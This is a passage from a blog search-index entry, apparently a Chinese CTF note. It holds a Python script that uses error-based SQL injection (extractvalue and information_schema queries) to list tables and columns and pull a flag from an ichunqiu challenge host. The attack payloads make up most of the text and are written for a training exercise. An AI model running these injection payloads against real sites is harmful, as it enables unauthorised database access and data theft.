=&quot;http://57b8a27f43c6473f91026a50a1ab287f41ab53c0f5144744.game.ichunqiu.com/index.php?id=extractvalue(1,%20concat(0x3a,(select%20table_name%20from%20information_schema.tables%20where%20table_schema like 0x776f726473%20limit%20&#123;&#125;,1)))&quot;.format(i) # url =&quot;http://57b8a27f43c6473f91026a50a1ab287f41ab53c0f5144744.game.ichunqiu.com/index.php?id=extractvalue(1,%20concat(0x3a,(select%20column_name%20from%20information_schema.columns%20where%20table_name like 0x66313467 limit%20&#123;&#125;,1)))&quot;.format(i) url =&quot;http://57b8a27f43c6473f91026a50a1ab287f41ab53c0f5144744.game.ichunqiu.com/index.php?id=extractvalue(1,%20concat(0x3a,(selectsubstring((select%20f14g from f14g),&#123;&#125;,1))))&quot;.format(i) flag = flag+requests.get(url).content.split(&apos;:&apos;)[2].replace(&apos;\&apos;&apos;,&apos;&apos;) print flag 以上就是一些没有过滤的时候的盲注脚本，以后会陆续添加有一些过滤的脚本]]></content>
  </entry>
</search>
